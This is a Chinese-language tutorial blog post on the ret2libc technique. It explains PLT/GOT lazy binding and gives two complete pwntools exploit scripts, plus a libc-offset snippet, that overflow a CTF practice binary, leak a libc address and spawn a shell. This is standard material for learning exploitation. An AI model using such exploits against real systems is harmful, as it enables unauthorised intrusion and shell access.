---
layout: post
title: ret2libc
category: StackOverflow
date: 2023-9-20 12:00:00
hide: true
---
ret2libc
<!-- more -->
# ret2libc

## plt、got、以及延迟绑定机制

首先写一下`plt`和`got`表，以及他们的延迟绑定机制。

复习一下C语言编译的四个阶段，预处理，编译，汇编，链接。

我们知道C语言程序一般会使用一些库函数，比如`printf()`这个库函数。而这个库函数的源码在哪里？在`libc`里面，因此C语言程序从文本文件编译成最后的可执行程序时，需要将库函数也处理好。我们以`printf()`函数为例子，写一下`plt`、`got`两个表的作用和延迟绑定机制。

在已经完成链接的代码中，调用`printf()`函数的大意是这样的：（只是示例，实际差不多）

```assembly
...
call print@plt
...
```

上面的意思就是调用哪个函数呢？调用`plt`表中的`print`函数。

而`plt`表中，对应`print@plt`的是这样一个部分：

```assembly
Disassembly of section .plt:

080482d0 <common@plt>:
 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004
 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008
 80482dc:	00 00                	add    %al,(%eax)
	...

080482e0 <print@plt>:
 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 80482e6:	68 00 00 00 00       	push   $0x0
 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 <_init+0x28>

080482f0 <__libc_start_main@plt>:
 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010
 80482f6:	68 08 00 00 00       	push   $0x8
 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 <_init+0x28>
```

上面分别有三个表项，分别是`common`（真实情况下不叫这个名字，而是最近的函数名）、`print`和`main`在`plt`表中的样子。

仍然看`print`表项，有三步：

第一步地址`80482e0`处是`jmp`到某个地址。这个其实就是`jmp`到`got`表中去查看`print`的真实地址了。

然而，此时`got`表中也没有存储`print`的真实地址，而是存储的`80482e6`。诶，这不是`print@plt`的第二步吗？怎么又返回到`plt`表中去了呢？

因为`plt`表中的第二步和第三步其实是“寻找`print`在`libc`中的地址，并将其写到`got`表中去”的意思。将真正的地址放到`got`表中后，以后若再次访问`print`函数的`got`表，就可以直接获得`print`函数的`libc`的地址了，这也就是延迟绑定机制。

总结一下，对于一个没有访问过的函数而言，查表流程是这样的：

`plt`->`got`->`plt`->`公共plt`->寻找在`libc`中的地址并存储到`got`表。

若该函数已经被访问过，则流程简单如下：

`call xxx@plt`->`plt`->`got`

## ret2libc流程

为什么要`ret2libc`？因为有的情况下，程序里面不会给我们提供一些显式的字符串，也没有可以利用的`gadgets`。但我们的程序需要使用库函数，是要连接`libc`库里面的，我们便可以利用`libc`库中的其他函数，只是需要知道函数在`libc`中的地址。虽然这个地址肯定是会变的，但是函数与函数间的相对地址不会变；或者说即使程序有ASLR保护，也只针对地址中间位进行随机，最低12位不会发生变化。因此我们只需要获得某一个函数在`libc`中的地址，就可以通过相对地址来获得其他的函数。

通过延迟访问机制后，我们即可明白：若直接访问一个没有访问过的函数的`got`表，是没有办法得到这个函数在`libc`中的真实地址的。因此，我们只能泄露一个已经访问的函数在`got`表中的地址。

这里写一个`wiki`里面的`exp`：

```python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

和另外一个，可以看一下区别：

```python
from pwn import *
from LibcSearcher import *

elf=ELF('ret2libc3')
p=process('./ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr = elf.symbols['_start']

#gdb.attach(p)
payload1='A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
p.sendlineafter("!?",payload1)
puts_addr=u32(p.recv(4))

libc=LibcSearcher('puts',puts_addr)
libcbase=puts_addr-libc.dump("puts")
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")

payload2='A'*112+p32(system_addr)+p32(1234)+p32(binsh_addr)
p.sendlineafter("!?",payload2)

p.interactive()
```

首先两个`exp`基本都是这样一种思路：因为程序内部有`puts`函数，所以我们通过栈溢出来让该函数打印出某个已经使用过的函数在`libc`中的地址，从而通过相对地址来得到`system`函数，并设置返回地址为`main`函数或者`start`函数，来再次通过栈溢出到`system`函数来进行攻击。

然而，可以看到，两个`exp`在第二次栈溢出时填充的字符的长度是不相等的，相差8个字符长度。这里写下原因，因为第一个`exp`的第一次栈溢出是回到了`main`，第二个`exp`的第一次栈溢出是回到了`start`函数。

我们知道函数调用的顺序是：`start()`->`main()`->`其他函数()`

因此若回到`start()`函数，程序会再次调用`main()`函数，从而调用其他函数；

若回到`main()`函数，程序将直接调用其他函数。

两者相差一个`main()`函数的`return address `和`ebp`，因此刚好差8个字节。



此外，使用本地的`libc`：

```python
libc = ELF('./libc-2.19.so')
libcbase = write_libc - libc.symbols['write']
system_libc = libcbase + libc.symbols['system']
bin_sh_libc = libcbase + next(libc.search(b'/bin/sh'))
```



**也可以使用`libc`里面的`gadgets`。**